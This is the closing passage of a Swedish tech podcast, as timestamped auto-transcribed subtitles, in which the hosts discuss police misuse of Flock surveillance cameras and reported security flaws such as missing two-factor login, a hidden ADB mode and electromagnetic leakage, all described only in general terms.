ett fall av misstänkt



`1890 01:03:48,520 --> 01:03:50,520`
försök till abort så skriver man



`1891 01:03:50,520 --> 01:03:52,520`
antingen skriver man inte alls ut vilket brott som



`1892 01:03:52,520 --> 01:03:54,520`
personen på utredningen



`1893 01:03:54,520 --> 01:03:56,520`
handlar om eller så skriver man in det här, vi utreder



`1894 01:03:56,520 --> 01:03:58,520`
ett mord eller liksom sådär.



`1895 01:03:58,520 --> 01:04:00,520`
Så att man ljuger



`1896 01:04:00,520 --> 01:04:02,520`
från andra polismyndigheter om varför



`1897 01:04:02,520 --> 01:04:04,520`
man



`1898 01:04:04,520 --> 01:04:06,520`
gör sökningar i flock.



`1899 01:04:06,520 --> 01:04:08,520`
Och



`1900 01:04:08,520 --> 01:04:10,520`
det har kommit fram massa



`1901 01:04:10,520 --> 01:04:12,520`
dåligheter om rent säkerhet.



`1902 01:04:12,520 --> 01:04:14,520`
Ja.



`1903 01:04:14,520 --> 01:04:16,520`
Men dels



`1904 01:04:16,520 --> 01:04:18,520`
så det krävs ju inte två faktor



`1905 01:04:18,520 --> 01:04:20,520`
för att använda flock så att



`1906 01:04:20,520 --> 01:04:22,520`
du vet ju i praktiken



`1907 01:04:22,520 --> 01:04:24,520`
inte vem som loggar in i flock



`1908 01:04:24,520 --> 01:04:26,520`
eftersom att det kan vara



`1909 01:04:26,520 --> 01:04:28,520`
en eller tio poliser



`1910 01:04:28,520 --> 01:04:30,520`
eller polisernas kompisar



`1911 01:04:30,520 --> 01:04:32,520`
eller gud vet vad som använder



`1912 01:04:32,520 --> 01:04:34,520`
ljusekontorna.



`1913 01:04:34,520 --> 01:04:36,520`
Man har hittat en



`1914 01:04:36,520 --> 01:04:38,520`
demosajt där massa poliskårer



`1915 01:04:38,520 --> 01:04:40,520`
har lagt upp



`1916 01:04:40,520 --> 01:04:42,520`
riktiga övervakningskameror



`1917 01:04:42,520 --> 01:04:44,520`
i demosajten.



`1918 01:04:46,520 --> 01:04:48,520`
Man har hittat ett par



`1919 01:04:48,520 --> 01:04:50,520`
stycken sätt att



`1920 01:04:50,520 --> 01:04:52,520`
att liksom



`1921 01:04:52,520 --> 01:04:54,520`
fucka med



`1922 01:04:54,520 --> 01:04:56,520`
själva kamerorna.



`1923 01:04:56,520 --> 01:04:58,520`
En av grejerna är att



`1924 01:04:58,520 --> 01:05:00,520`
om du trycker



`1925 01:05:00,520 --> 01:05:02,520`
på något lite hemligt sätt



`1926 01:05:02,520 --> 01:05:04,520`
så aktiverar du en



`1927 01:05:04,520 --> 01:05:06,520`
adb



`1928 01:05:06,520 --> 01:05:08,520`
alltså android adb



`1929 01:05:08,520 --> 01:05:10,520`
end så att du kan liksom



`1930 01:05:10,520 --> 01:05:12,520`
gå in och



`1931 01:05:12,520 --> 01:05:14,520`
You are now a developer.



`1932 01:05:14,520 --> 01:05:16,520`
Ja precis.



`1933 01:05:16,520 --> 01:05:18,520`
Det är också så att de



`1934 01:05:18,520 --> 01:05:20,520`
förmodligen så



`1935 01:05:20,520 --> 01:05:22,520`
skulle de här inte



`1936 01:05:22,520 --> 01:05:24,520`
få vara godkända som



`1937 01:05:24,520 --> 01:05:26,520`
konsumentelektronik för att de



`1938 01:05:26,520 --> 01:05:28,520`
har jättemycket



`1939 01:05:28,520 --> 01:05:30,520`
elektromagnetisk spänning och



`1940 01:05:30,520 --> 01:05:32,520`
de demade att



`1941 01:05:32,520 --> 01:05:34,520`
du kan alltså utifrån



`1942 01:05:34,520 --> 01:05:36,520`
EMI-läckaget så kan du på något



`1943 01:05:36,520 --> 01:05:38,520`
sätt få fram



`1944 01:05:38,520 --> 01:05:40,520`
vad som, vad kameran ser



`1945 01:05:40,520 --> 01:05:42,520`
bara genom att mäta vissa signaler.



`1946 01:05:42,520 --> 01:05:44,520`
Det måste vara rejält ibland.



`1947 01:05:44,520 --> 01:05:46,520`
Ja det måste alltså



`1948 01:05:46,520 --> 01:05:48,520`
Inte såhär liksom sidechannel i labbmiljö



`1949 01:05:48,520 --> 01:05:50,520`
utan.



`1950 01:05:50,520 --> 01:05:52,520`
Nej alltså som någon sa där



`1951 01:05:52,520 --> 01:05:54,520`
det är inte helt realistiskt för att



`1952 01:05:54,520 --> 01:05:56,520`
du måste vara ganska nära kameran och är du så nära kameran



`1953 01:05:56,520 --> 01:05:58,520`
kanske du lika gärna bara kan hacka kameran.



`1954 01:05:58,520 --> 01:06:00,520`
Ja för då har du ju en adb-port.



`1955 01:06:00,520 --> 01:06:02,520`
Precis så den är



`1956 01:06:02,520 --> 01:06:04,520`
diskutabel om den är



`1957 01:06:04,520 --> 01:06:06,520`
real world eller den här vi alltså



`1958 01:06:06,520 --> 01:06:08,520`
men du kan med någonting



`1959 01:06:08,520 --> 01:06:10,520`
få veta vad kameran ser.



`1960 01:06:10,520 --> 01:06:12,520`
Undrar vad det är svenska polisen



`1961 01:06:12,520 --> 01:06:14,520`
kör med, de har ju slängt upp lite sådana här



`1962 01:06:14,520 --> 01:06:16,520`
övervakningskameror nu i våran



`1963 01:06:16,520 --> 01:06:18,520`
stad har man ju sett.



`1964 01:06:18,520 --> 01:06:20,520`
Man kan hoppas.



`1965 01:06:20,520 --> 01:06:22,520`
Någon borde undersöka detta.



`1966 01:06:22,520 --> 01:06:24,520`
Men



`1967 01:06:24,520 --> 01:06:26,520`
Det går bra att höra av sig under pseudonym.



`1968 01:06:26,520 --> 01:06:28,520`
Men det finns dels



`1969 01:06:28,520 --> 01:06:30,520`
killen med kameran.



`1970 01:06:30,520 --> 01:06:32,520`
Det finns dels en rapport



`1971 01:06:32,520 --> 01:06:34,520`
och de som har gjort rapporten har



`1972 01:06:34,520 --> 01:06:36,520`
demat



`1973 01:06:36,520 --> 01:06:38,520`
attackerna för lite



`1974 01:06:38,520 --> 01:06:40,520`
senatorer i USA



`1975 01:06:40,520 --> 01:06:42,520`
Som tyckte det var fantastiskt.



`1976 01:06:42,520 --> 01:06:44,520`
Det finns en kul



`1977 01:06:44,520 --> 01:06:46,520`
lång video där de



`1978 01:06:46,520 --> 01:06:48,520`
demar, de underhåller



`1979 01:06:48,520 --> 01:06:50,520`
ju sådana här information som exakt



`1980 01:06:50,520 --> 01:06:52,520`
vilka magiska tryckningar man trycker för att



`1981 01:06:52,520 --> 01:06:54,520`
aktivera adb och liksom sådana här



`1982 01:06:54,520 --> 01:06:56,520`
vissa detaljer.



`1983 01:06:56,520 --> 01:06:58,520`
Underlåter dem att dela med



`1984 01:06:58,520 --> 01:07:00,520`
och sådär och de



`1985 01:07:00,520 --> 01:07:02,520`
de har ju liksom



`1986 01:07:02,520 --> 01:07:04,520`
avmaskat lite



`1987 01:07:04,520 --> 01:07:06,520`
av den informationen de fick ut från



`1988 01:07:06,520 --> 01:07:08,520`
demosajten och sådant.



`1989 01:07:08,520 --> 01:07:10,520`
Det var bara att avse till Flock och säga hej jag är poliskonstapel Björk



`1990 01:07:10,520 --> 01:07:12,520`
jag vill ha en produktdemonstration.



`1991 01:07:12,520 --> 01:07:14,520`
Särskilt på den



`1992 01:07:14,520 --> 01:07:16,520`
hemliga kommandorörelsen som spånar



`1993 01:07:16,520 --> 01:07:18,520`
adb-käll.



`1994 01:07:18,520 --> 01:07:20,520`
Kanske lite explicit beställning men ja tack.



`1995 01:07:20,520 --> 01:07:22,520`
Men det är lite kul



`1996 01:07:22,520 --> 01:07:24,520`
att Flock, för de har ju fått



`1997 01:07:24,520 --> 01:07:26,520`
enormt mycket skit



`1998 01:07:26,520 --> 01:07:28,520`
för



`1999 01:07:28,520 --> 01:07:30,520`
hur systemet har missbrukats



`2000 01:07:30,520 --> 01:07:32,520`
och att man på väldigt



`2001 01:07:32,520 --> 01:07:34,520`
lösa



`2002 01:07:34,520 --> 01:07:36,520`
typ



`2003 01:07:36,520 --> 01:07:38,520`
jag såg att din bil ens var i närheten



`2004 01:07:38,520 --> 01:07:40,520`
av våran stad alltså är du skurken



`2005 01:07:40,520 --> 01:07:42,520`
och sådär



`2006 01:07:42,520 --> 01:07:44,520`
och det här att man har



`2007 01:07:44,520 --> 01:07:46,520`
förföljt kvinnor via Flock och annat



`2008 01:07:46,520 --> 01:07:48,520`
så det har varit en hel bunt sådana här där



`2009 01:07:48,520 --> 01:07:50,520`
det har varit sådana här dåliga



`2010 01:07:50,520 --> 01:07:52,520`
privacy stories runt Flock men



`2011 01:07:52,520 --> 01:07:54,520`
nu kommer det alltså ha en bunt



`2012 01:07:54,520 --> 01:07:56,520`
demonstrationerna



`2013 01:07:56,520 --> 01:07:58,520`
även it-tekniskt



`2014 01:07:58,520 --> 01:08:00,520`
det känns på alla plan



`2015 01:08:00,520 --> 01:08:02,520`
även om du skiter i privacy och mänskliga rättigheter



`2016 01:08:02,520 --> 01:08:04,520`
och annat så



`2017 01:08:04,520 --> 01:08:06,520`
rent teknisk säkerhet



`2018 01:08:06,520 --> 01:08:08,520`
så är det en skräp också



`2019 01:08:08,520 --> 01:08:10,520`
ja shit



`2020 01:08:10,520 --> 01:08:12,520`
jag är cirka 0%



`2021 01:08:12,520 --> 01:08:14,520`
har det varit en



`2022 01:08:14,520 --> 01:08:16,520`
wild ride då känns det som



`2023 01:08:16,520 --> 01:08:18,520`
verkligen högt och lågt



`2024 01:08:18,520 --> 01:08:20,520`
vad har vi nått vägs ände



`2025 01:08:20,520 --> 01:08:22,520`
ja jag tror det



`2026 01:08:22,520 --> 01:08:24,520`
ska vi ta och tacka för oss jag som pratade



`2027 01:08:24,520 --> 01:08:26,520`
Johan Rubemöller med Heddy och Jesper Larsson



`2028 01:08:26,520 --> 01:08:28,520`
det hade du



`2029 01:08:28,520 --> 01:08:30,520`
den osynliga



`2030 01:08:30,520 --> 01:08:32,520`
ha det gött hej



`2031 01:08:32,520 --> 01:08:34,520`
hej hej



`2032 01:08:36,520 --> 01:08:38,520`
there is no coming back after this



`2033 01:08:38,520 --> 01:08:40,520`
nu kommer vi bli cancelade



`2034 01:08:40,520 --> 01:08:42,520`
den var lite torr



`2035 01:08:42,520 --> 01:08:44,520`
det får man ändå säga



`2036 01:08:44,520 --> 01:08:46,520`
okej kör vi


